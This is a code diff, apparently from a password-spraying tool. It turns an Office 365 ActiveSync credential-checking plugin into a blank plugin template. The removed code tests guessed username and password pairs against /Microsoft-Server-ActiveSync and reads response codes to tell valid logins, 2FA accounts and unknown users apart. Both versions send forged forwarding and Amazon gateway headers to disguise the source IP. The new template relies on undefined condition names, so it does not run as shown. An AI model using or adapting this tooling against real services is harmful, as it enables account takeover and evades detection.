@@ -18,10 +18,15 @@ def generate_trace_id():
     return str + first + "-" + second
 
 
-def o365_authenticate(url, username, password, useragent, pluginargs):
+def template_authenticate(url, username, password, useragent, pluginargs): # CHANGEME: replace template with plugin name
 
     ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
 
+    # not all of these are used, provided for future dev if needed
+    # Only ones necessary to return at the moment are:
+    # error
+    # output
+    # success
     data_response = {
         'timestamp': ts,
         'username': username,
@@ -37,61 +42,44 @@ def o365_authenticate(url, username, password, useragent, pluginargs):
         'cookies': [],
         'sourceip' : None,
         'throttled' : False,
-		'error' : False,
+        'error' : False,
         'output' : ""
     }
-
-    INVALID_LOGIN = "INVALID_LOGIN"
-    INVALID_USER = "INVALID_USER"
-    VALID_PASSWD_2FA = "VALID_PASSWD_2FA"
-    VALID_LOGIN = "VALID_LOGIN"
-    UNKNOWN = "UNKNOWN"
-
-    symbols = {
-        INVALID_LOGIN: "-",
-        INVALID_USER: "-",
-        VALID_PASSWD_2FA: "#",
-        VALID_LOGIN: "!",
-        UNKNOWN: "?"
-    }
-    template = "[{s}] {code} {valid} {user}:{password}"
-
 
     spoofed_ip = generate_ip()
     amazon_id = generate_id()
     trace_id = generate_trace_id()
 
-
+    # CHANGEME: Add more if necessary
     headers = {
-        "MS-ASProtocolVersion": "14.0",
         'User-Agent': useragent,
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
     }
 
+
     try:
-        r = requests.options("{}/Microsoft-Server-ActiveSync".format(url), auth=(username, password), headers=headers, timeout=30)
 
-        status = r.status_code
-        valid = ""
+        resp = requests.post("{}/uri".format(url),headers=headers)
 
-        if status == 401:
-            valid = INVALID_LOGIN
-            data_response['success'] = False
-        elif status == 404:
-            if r.headers.get("X-CasErrorCode") == "UserNotFound":
-                valid = INVALID_USER
-            data_response['success'] = False
-        elif status == 403:
-            valid = VALID_PASSWD_2FA
+        if Success:
             data_response['success'] = True
+            data_response['output'] = 'SUCCESS_MESSAGE: => {}:{}'.format(username, password)
+
+        elif Success_but_2fa:
+            data_response['success'] = True
+            data_response['output'] = 'SUCCESS_2FA_MESSAGE: => {}:{}'.format(username, password)
             data_response['2fa_enabled'] = True
-        elif status == 200:
-            valid = VALID_LOGIN
-            data_response['success'] = True
 
-        data_response['output'] = template.format(s=symbols[valid], code=status, valid=valid, user=username, password=password)
+        elif lockout_or_pwd_expired_or_other:
+            data_response['success'] = False
+            data_response['output'] = 'ISSUE_MESSAGE: {} => {}:{}'.format(resp.status_code, username, password)
+
+        else: #fail
+            data_response['success'] = False
+            data_response['output'] = 'FAILURE_MESSAGE: {} => {}:{}'.format(resp.status_code, username, password)
+            data_response['2fa_enabled'] = True
 
     except Exception as ex:
         data_response['error'] = True
